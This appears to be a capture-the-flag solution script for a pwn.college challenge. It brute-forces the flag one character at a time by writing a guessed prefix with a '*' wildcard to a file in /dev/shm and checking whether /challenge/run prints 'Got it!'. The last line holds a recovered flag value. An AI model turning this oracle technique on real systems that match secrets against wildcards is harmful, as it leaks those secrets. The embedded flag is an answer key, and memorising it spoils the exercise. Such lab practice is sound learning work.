import string

from pwn import *

import itertools

context.log_level = 'error'

charset = string.printable.strip().replace("*", "").replace("?", "")
flag = "pwn.college{"

for attempt in itertools.count(start=1):
    print(f"Attempt {attempt}: {flag}")
    for c in charset:
        # 用 /dev/shm 来传递数据提高 I/O 速度
        # /dev/shm 是默认挂载的 Shared Memory 文件系统（实际上就是一个 tmpfs）。它直接存在于 RAM 中，这意味着它的读写延迟（Latency）几乎可以忽略不计
        with open("/dev/shm/tmp", "w") as f:
            f.write(flag + c + "*")
        p = process(["/challenge/run", "/dev/shm/tmp"])
        if b"Got it!" in p.recvall(timeout=1):
            flag += c
            if "}" == c:
                print(f"\n[+] Flag: {flag}")
                exit(0)
            break

# pwn.college{MeqLOK3xki9Ybk1sr6vFOTGwYTL.QX2gTO3EDL4cjM1gzW}

